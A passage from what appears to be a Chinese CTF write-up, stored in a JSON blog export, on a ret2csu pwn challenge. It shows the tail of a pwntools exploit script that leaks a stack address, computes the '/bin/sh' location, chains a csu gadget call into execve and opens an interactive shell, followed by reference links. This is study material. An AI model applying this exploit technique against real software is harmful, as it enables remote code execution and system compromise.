data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>binsh<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x118</span> <span class=\"token comment\">#减去偏移获得 \"/bin/sh\" 地址</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>binsh<span class=\"token operator\">+</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>binsh<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 这里的 binsh+0x50 是传入字符串 \"/bin/sh\" 后开始，到 p64（execve）</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#p.recv()</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>借用别人的一张图理解 binsh+0x50<br />\n<img data-src=\"https://img-blog.csdnimg.cn/20210423174224878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpZXlpY2hlbnNzcw==,size_16,color_FFFFFF,t_70\" alt=\"\" /></p>\n<p>参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9aTEZ4RA==\">http://t.csdn.cn/ZLFxD</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9TU1k5bw==\">http://t.csdn.cn/SSY9o</span></p>\n<p>注意：不知道是不是因为部分地方没写对，用之前的 csu 方法有点问题，总要 binsh+0x50 才可以</p>\n",
            "tags": [
                "pwn",
                "ret2csu",
                "ctf",
                "系统调用"
            ]
        }
    ]
}